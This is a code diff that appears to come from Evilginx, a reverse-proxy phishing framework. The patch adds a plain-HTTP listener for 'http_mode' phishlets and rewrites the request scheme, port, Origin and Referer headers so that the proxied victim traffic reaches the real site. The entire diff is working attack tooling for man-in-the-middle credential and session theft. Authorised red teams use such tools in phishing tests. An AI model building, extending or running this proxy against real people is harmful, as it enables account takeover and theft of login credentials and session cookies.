@@ -64,6 +64,7 @@ var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}
 
 type HttpProxy struct {
 	Server            *http.Server
+	HttpServer        *http.Server // HTTP server for http_mode phishlets
 	Proxy             *goproxy.ProxyHttpServer
 	crt_db            *CertDb
 	cfg               *Config
@@ -71,7 +72,9 @@ type HttpProxy struct {
 	bl                *Blacklist
 	gophish           *GoPhish
 	sniListener       net.Listener
+	httpListener      net.Listener // HTTP listener for http_mode phishlets
 	isRunning         bool
+	isHttpRunning     bool
 	sessions          map[string]*Session
 	sids              map[string]int
 	cookieName        string
@@ -106,16 +109,18 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, http_port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
+		HttpServer:        nil,
 		crt_db:            crt_db,
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
 		gophish:           NewGoPhish(),
 		isRunning:         false,
+		isHttpRunning:     false,
 		last_sid:          0,
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
@@ -123,8 +128,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
+	// HTTPS server (main server)
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
+		Handler:      p.Proxy,
+		ReadTimeout:  httpReadTimeout,
+		WriteTimeout: httpWriteTimeout,
+	}
+
+	// HTTP server for http_mode phishlets (no TLS)
+	p.HttpServer = &http.Server{
+		Addr:         fmt.Sprintf("%s:%d", hostname, http_port),
 		Handler:      p.Proxy,
 		ReadTimeout:  httpReadTimeout,
 		WriteTimeout: httpWriteTimeout,
@@ -147,7 +161,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-		req.URL.Scheme = "https"
+		// Determine scheme based on whether this is an HTTP-mode hostname
+		if p.cfg.IsActiveHttpHostname(req.Host) {
+			req.URL.Scheme = "http"
+		} else {
+			req.URL.Scheme = "https"
+		}
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
 	})
@@ -202,6 +221,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Store original phish host for scheme detection
+			phish_host := req.Host
+
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
@@ -211,7 +233,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
-			pl := p.getPhishletByPhishHost(req.Host)
+			pl := p.getPhishletByPhishHost(phish_host)
 			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
@@ -618,12 +640,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					req.Host = r_host
 				}
 
+				// Set correct scheme for connecting to origin server based on phishlet config
+				if pl != nil {
+					orig_scheme := pl.GetOrigSchemeForHost(req.Host)
+					req.URL.Scheme = orig_scheme
+				}
+
+				// Update URL host to match the replaced host for correct proxy destination
+				req.URL.Host = req.Host
+
 				// fix origin
 				origin := req.Header.Get("Origin")
 				if origin != "" {
 					if o_url, err := url.Parse(origin); err == nil {
 						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
 							o_url.Host = r_host
+							// Use correct scheme for origin
+							if pl != nil {
+								o_url.Scheme = pl.GetOrigSchemeForHost(r_host)
+							}
 							req.Header.Set("Origin", o_url.String())
 						}
 					}
@@ -646,6 +681,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if o_url, err := url.Parse(referer); err == nil {
 						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
 							o_url.Host = r_host
+							// Use correct scheme for referer
+							if pl != nil {
+								o_url.Scheme = pl.GetOrigSchemeForHost(r_host)
+							}
 							req.Header.Set("Referer", o_url.String())
 						}
 					}
@@ -1645,22 +1684,41 @@ func (p *HttpProxy) httpsWorker() {
 				return
 			}
 
-			hostname, _ = p.replaceHostWithOriginal(hostname)
+			// Get origin scheme before replacing hostname
+			phish_hostname := hostname
+			orig_hostname, _ := p.replaceHostWithOriginal(hostname)
+
+			// Determine origin scheme and port based on phishlet config
+			orig_scheme, orig_port := p.getOriginSchemeAndPort(phish_hostname, orig_hostname)
 
 			req := &http.Request{
 				Method: "CONNECT",
 				URL: &url.URL{
-					Opaque: hostname,
-					Host:   net.JoinHostPort(hostname, "443"),
+					Opaque: orig_hostname,
+					Host:   net.JoinHostPort(orig_hostname, orig_port),
 				},
-				Host:       hostname,
+				Host:       orig_hostname,
 				Header:     make(http.Header),
 				RemoteAddr: c.RemoteAddr().String(),
 			}
+			// Store origin scheme in header for later use
+			req.Header.Set("X-Evilginx-Origin-Scheme", orig_scheme)
 			resp := dumbResponseWriter{tlsConn}
 			p.Proxy.ServeHTTP(resp, req)
 		}(c)
 	}
+}
+
+// getOriginSchemeAndPort returns the scheme (http/https) and port for connecting to origin server
+func (p *HttpProxy) getOriginSchemeAndPort(phish_hostname string, orig_hostname string) (string, string) {
+	pl := p.getPhishletByPhishHost(phish_hostname)
+	if pl != nil {
+		scheme := pl.GetOrigSchemeForHost(orig_hostname)
+		if scheme == "http" {
+			return "http", "80"
+		}
+	}
+	return "https", "443"
 }
 
 func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
@@ -1870,7 +1928,28 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
+	go p.httpWorker()
 	return nil
+}
+
+// httpWorker handles plain HTTP connections for phishlets with http_mode enabled
+func (p *HttpProxy) httpWorker() {
+	var err error
+
+	p.httpListener, err = net.Listen("tcp", p.HttpServer.Addr)
+	if err != nil {
+		log.Error("http: failed to start HTTP listener on %s: %v", p.HttpServer.Addr, err)
+		return
+	}
+
+	log.Info("http: listening on %s for HTTP-mode phishlets", p.HttpServer.Addr)
+	p.isHttpRunning = true
+
+	// Use standard HTTP server to handle connections properly
+	err = p.HttpServer.Serve(p.httpListener)
+	if err != nil && err != http.ErrServerClosed {
+		log.Error("http: server error: %v", err)
+	}
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
